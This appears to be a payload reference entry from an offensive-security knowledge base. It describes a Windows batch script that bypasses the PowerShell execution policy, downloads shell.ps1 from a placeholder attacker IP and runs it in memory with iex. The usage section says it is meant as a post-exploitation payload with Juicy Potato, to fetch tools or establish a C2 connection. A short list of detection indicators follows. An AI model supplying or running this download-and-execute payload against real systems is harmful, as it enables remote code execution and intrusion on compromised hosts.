---
id: 3e3b9152-c3d0-4b5e-8d93-465cf91ea733
name: Windows-Batch-Download-and-Execute-PowerShell
type: code
language: batch
verified: true
created_at: '2020-06-24T21:19:46.823050+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - payload
  - download-execute
  - powershell
validated: true
---

# Windows-Batch-Download-and-Execute-PowerShell

## Code

```batch
@ECHO OFF
powershell.exe -ep bypass "iex(New-Object Net.WebClient).downloadString('http://$_ATTACKER_IP/shell.ps1')"
```

## Description

This batch script bypasses PowerShell execution policy and downloads a remote script from an attacker-controlled server, then executes it in memory using Invoke-Expression (iex). It's a simple payload for post-exploitation, often used after privilege escalation to fetch more advanced tools or establish a C2 connection without writing to disk extensively.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's server hosting the PowerShell script | 10.10.10.100 |

## Usage

Save as a .bat file (e.g., shell.bat) and execute it as the payload in privilege escalation tools like Juicy Potato. Ensure a listener or web server is running on the attacker side to serve shell.ps1, which could contain reverse shell code or reconnaissance commands. Used in scenarios where initial access is gained but more capabilities are needed.

## Detection

- PowerShell execution logs (Module Logging, Script Block Logging) showing iex and Net.WebClient usage.
- Network traffic to unusual IPs on port 80/443 for script downloads.
- Process tree: cmd.exe spawning powershell.exe with -ep bypass.
- AMSI (Antimalware Scan Interface) scans if enabled.

## Related

- [[procedures/Escalate-Privileges-Using-Juicy-Potato]]
- [[tools/Powershell]]
